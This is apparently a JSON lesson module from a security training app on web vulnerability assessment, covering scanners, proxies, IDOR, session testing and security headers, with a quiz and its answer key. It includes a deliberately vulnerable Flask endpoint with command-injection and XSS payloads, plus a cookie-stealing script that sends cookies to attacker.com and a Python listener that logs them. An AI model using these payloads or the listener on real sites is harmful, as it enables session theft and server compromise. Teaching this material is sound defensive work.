{
    "id": "learn_web_vuln_assessment",
    "topicId": "web_vuln_assessment",
    "topicTitle": "Web Vulnerability Assessment",
    "description": "Dive into the specific techniques for finding flaws in web applications, from scanners to manual hacking.",
    "baseKP": 100,
    "slides": [
        {
            "id": "wva_1",
            "type": "content",
            "title": "Introduction to Web Vuln Assessment",
            "content": "# Web Assessment üï∏Ô∏è\n\nWeb Apps are the most attacked surface because they are **publicly accessible** and **custom code**.\n\n## The OWASP Top 10\nThe standard awareness document for the most critical security risks to web applications.\n1.  Broken Access Control\n2.  Cryptographic Failures\n3.  Injection\n4.  Insecure Design\n5.  Security Misconfiguration\n...and 5 more.\n\n> üéØ **Goal:** Test if the app can be tricked into doing something it shouldn't."
        },
        {
            "id": "wva_2",
            "type": "content",
            "title": "Automated Scanners (DAST)",
            "content": "# Automated Web Scanners ü§ñ\n\nDynamic Application Security Testing (DAST).\n\n## How they work\n1.  **Crawl:** Visit every link, submit every form (`Spidering`).\n2.  **Audit:** Inject payloads (`' OR 1=1`, `<script>`) into every input and analyze the response.\n\n## Popular Tools\n- **OWASP ZAP (Zed Attack Proxy):** Free, Open Source, great for beginners.\n- **Burp Suite Professional:** The industry standard. Powerful manual + auto tools.\n- **Acunetix:** Enterprise grade.\n\n> üí° **Limit:** Scanners are bad at Logic Flaws (e.g., \"Can I buy items for $0?\")."
        },
        {
            "id": "wva_3",
            "type": "content",
            "title": "Manual Testing Techniques",
            "content": "# Manual Testing üß†\n\nWhere the scanner stops, the human begins.\n\n## Intercepting Proxies (Burp Suite)\nThis is the Hacker's Cockpit. It sits between your browser and the server.\n1.  Browser sends Request.\n2.  Burp **pauses** the request.\n3.  Hacker **modifies** data (changes `price=100` to `price=1`, or `role=user` to `role=admin`).\n4.  Burp forwards to Server.\n\nThis bypasses all client-side validation (Javascript)."
        },
        {
            "id": "wva_4",
            "type": "content",
            "title": "Input Validation Demo",
            "content": "# Testing Input Validation üß™\n\nTesting if the app accepts bad data.\n\n```python\n# Vulnerable Python/Flask endpoint\n@app.route('/lookup')\ndef lookup():\n    # No validation! Takes input directly to shell.\n    domain = request.args.get('domain')\n    os.system(\"nslookup \" + domain)\n```\n\n**Test Payloads:**\n- `google.com; cat /etc/passwd` (Command Injection)\n- `google.com && whoami`\n- `<script>alert(1)</script>` (XSS)\n\nIf the server executes the second command, it's vulnerable."
        },
        {
            "id": "wva_5",
            "type": "content",
            "title": "Session Management Testing",
            "content": "# Session Management üç™\n\nHow does the server know it's you?\n\n## Session hijacking\nStealing the Session ID (Cookie).\n- **XSS:** Javascript can read `document.cookie` if `HttpOnly` flag is missing.\n- **Sniffing:** Reading traffic if HTTPS is missing (`Secure` flag).\n\n## Weak Tokens\n- Are session IDs predictable?\n- **Test:** Login 100 times. Collect IDs. Graph them. If they increment (`sess_100`, `sess_101`), you can guess the next one (Session Prediction)."
        },
        {
            "id": "wva_6",
            "type": "content",
            "title": "Configuration Review",
            "content": "# Web Config Review üìã\n\nChecking the headers and server settings.\n\n## Security Headers\n- **Strict-Transport-Security (HSTS):** Enforces HTTPS.\n- **Content-Security-Policy (CSP):** Prevents XSS by limiting where scripts can load from.\n- **X-Frame-Options:** Prevents Clickjacking (loading site in iframe).\n\n## Directory Listing\nAre users allowed to see files? requesting `/images/` should show a 403 Forbidden, not a list of files."
        },
        {
            "id": "wva_7",
            "type": "content",
            "title": "Insecure Direct Object References (IDOR)",
            "content": "# Manual Test: IDOR üö™\n\nScanners often miss IDORs because they don't know who owns what data.\n\n**Scenario:**\n1.  Login as User A. View profile: `/profile?id=500`.\n2.  Login as User B. View profile: `/profile?id=501`.\n3.  **Test:** As User A, change URL to `/profile?id=501`.\n4.  **Result:** If you see User B's data -> Vulnerable.\n\n> üõ°Ô∏è **Fix:** Server must check `if request.user.id == profile.owner_id`."
        },
        {
            "id": "wva_8",
            "type": "content",
            "title": "Coding: Cookie Stealer (Concept)",
            "content": "# Coding: XSS Cookie Stealer Demo üç™\n\nDemonstrating why XSS is dangerous.\n\n```javascript\n// Evil Javascript Payload\nvar img = new Image();\nimg.src = \"http://attacker.com/steal?cookie=\" + document.cookie;\n```\n\n<!-- FULL_CODE_START\n# This is a Python server waiting to receive the stolen cookies\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import urlparse, parse_qs\nimport datetime\n\nprint(\"=== XSS Cookie Stealer Server ===\\n\")\n\nclass EvilServer(BaseHTTPRequestHandler):\n    def do_GET(self):\n        # Parse the URL\n        query = urlparse(self.path).query\n        params = parse_qs(query)\n        \n        if 'cookie' in params:\n            stolen_cookie = params['cookie'][0]\n            print(f\"[!] {datetime.datetime.now()} - STOLEN COOKIE RECEIVED:\")\n            print(f\"    {stolen_cookie}\")\n            \n            # Save to file\n            with open(\"loot.txt\", \"a\") as f:\n                f.write(f\"{stolen_cookie}\\n\")\n        \n        # Send a benign image back (pixel tracking)\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"image/gif\")\n        self.end_headers()\n        # 1x1 Transparent GIF\n        self.wfile.write(b'GIF89a\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\xff\\xff\\xff\\x00\\x00\\x00!\\xf9\\x04\\x01\\x00\\x00\\x00\\x00,\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x02\\x02D\\x01\\x00;')\n\nprint(\"Starting malicious listener on localhost:8000...\")\nprint(\"If a victim loads our XSS payload, their cookies will appear here.\")\nprint(\"(Press Ctrl+C to stop in real terminal)\")\n\n# Simulating a hit\nprint(\"\\n--- Simulation: Victim visits infected page ---\")\nsimulated_request = \"GET /steal?cookie=session_id=123456789;secret=admin_access HTTP/1.1\"\nprint(f\"Victim Request: {simulated_request}\")\n\n# We manually trigger the logic for Piston demo\nparams = {'cookie': ['session_id=123456789;secret=admin_access']}\nstolen_cookie = params['cookie'][0]\nprint(f\"\\n[!] STOLEN COOKIE RECEIVED:\")\nprint(f\"    {stolen_cookie}\")\nFULL_CODE_END -->"
        },
        {
            "id": "wva_9",
            "type": "quiz",
            "title": "Web Assessment Quiz",
            "content": "Check your web testing knowledge.",
            "quizQuestion": "Which security header is designed to prevent Cross-Site Scripting (XSS) by restricting sources of executable scripts?",
            "quizOptions": [
                "Strict-Transport-Security (HSTS)",
                "X-Frame-Options",
                "Content-Security-Policy (CSP)",
                "X-Content-Type-Options"
            ],
            "correctOptionIndex": 2
        },
        {
            "id": "wva_10",
            "type": "content",
            "title": "Module Summary",
            "content": "# Module Summary üéì\n\nYou are now ready to test the web.\n\n## Recap\n- **Automated:** ZAP and Burp cover the basics.\n- **Manual:** Proxying allows logic testing.\n- **Input Validation:** Trust no one.\n- **Sessions:** Protect the cookie.\n- **Headers:** Configure the server defenses.\n\n## What's Next?\nWeb is just one service. What about the rest of the network? Next module: **Network Vulnerability Assessment**."
        }
    ]
}